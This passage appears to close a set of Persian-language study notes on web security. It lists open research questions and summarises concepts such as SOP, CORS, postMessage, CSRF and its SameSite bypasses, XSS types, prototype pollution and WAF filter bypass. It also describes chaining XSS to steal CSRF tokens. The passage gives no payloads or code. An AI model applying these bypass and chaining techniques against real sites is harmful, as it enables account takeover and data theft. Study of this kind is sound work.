از این نوع اشتباه (فیلتر قبل از Decode) موارد مشابه هم رخ می‌ده:
- Open Redirect
- SQLi

---

# بخش ۱۴ — نکات پراکنده و آیتم‌های باز (نیاز به تحقیق بیشتر)

این موارد در فایل‌های اصلی به‌عنوان `#research` یا سؤال باز مطرح شده بودن و باید بعداً تکمیل بشن:

- [ ] `switch` statement در JS — بررسی عمیق‌تر
- [ ] `massdns` — بررسی کاربرد در Recon
- [ ] UTF-7, UTF-6, UTF-32 به‌عنوان روش‌های Encoding برای Bypass
- [ ] چطور CSRF Token رو در Body پیدا کنیم؟
- [ ] الگوریتم‌های دیگر برای Bypass کردن CSRF Protection
- [ ] `<textarea>` — دقیقاً چه Escape ای لازمه (ناقص در فایل اصلی)
- [ ] مقاله‌ی ویرگول پارسا درباره‌ی CORS (مطالعه نشده هنوز)
- [ ] JWT — بررسی عمیق‌تر در ارتباط با CORS misconfiguration

---

# جمع‌بندی نهایی: زنجیره‌ی مفهومی کل جزوه

۱. **DOM/BOM** پایه‌ی دسترسی JS به صفحه‌ست
۲. **AJAX/Fetch** روش‌های ارتباط بدون رفرش با سرورن — پایه‌ی خیلی از اکسپلویت‌ها (مثل دزدیدن token)
۳. **SOP** محدودیت پایه‌ی امنیتی مرورگره که جلوی خوندن Cross-Origin رو می‌گیره
۴. **CORS** راه رسمی برای دور زدن SOP با اجازه‌ی صریحه — misconfig توش خطرناکه
۵. **PostMessage** راه دیگه‌ای برای دور زدن SOPه — misconfig توش (عدم چک Origin، استفاده از `*`) منجر به XSS و Data Hijacking می‌شه
۶. **CSRF** با استفاده از خودکار بودن ارسال کوکی توسط مرورگر کار می‌کنه — امروزه با Framework ها و SameSite خیلی محدود شده، ولی روش‌های کشف مرحله‌ای و Bypassهای SameSite (Lax با Method Override، Strict با Open Redirect) هنوز جواب می‌دن
۷. **XSS** هسته‌ی اصلی حمله‌ست — انواعش (Reflected/Stored/DOM/Blind/Self) بسته به این تفاوت دارن که کجا اجرا می‌شن، کاربر چقدر مستقیم درگیره، و آیا در View-Source دیده می‌شن یا نه
۸. **Prototype Pollution** یک مسیر جانبی برای رسیدن به XSS/RCE ـه — از طریق `__proto__` می‌شه مقادیر پیش‌فرض ست‌نشده رو کنترل کرد
۹. **WAF Bypass** (Encoding تو فصل مجزا، String building، Normalization) روشیه که پیلود XSS رو از فیلترها رد می‌کنیم
۱۰. **XSRF+XSS Chaining** نشون می‌ده چطور یک XSS ساده (حتی Reflected) می‌تونه با دزدیدن CSRF Token از DOM، یک محافظت به‌ظاهر قوی رو کامل بی‌اثر کنه
۱۱. **Recon/Automation** روش سیستماتیک برای پیدا کردن نقاط ورود این آسیب‌پذیری‌ها در مقیاس بزرگه

---

## برچسب‌های پیشنهادی ابسیدین

`#xss` `#dom` `#cors` `#csrf` `#postmessage` `#prototype-pollution` `#waf` `#recon`
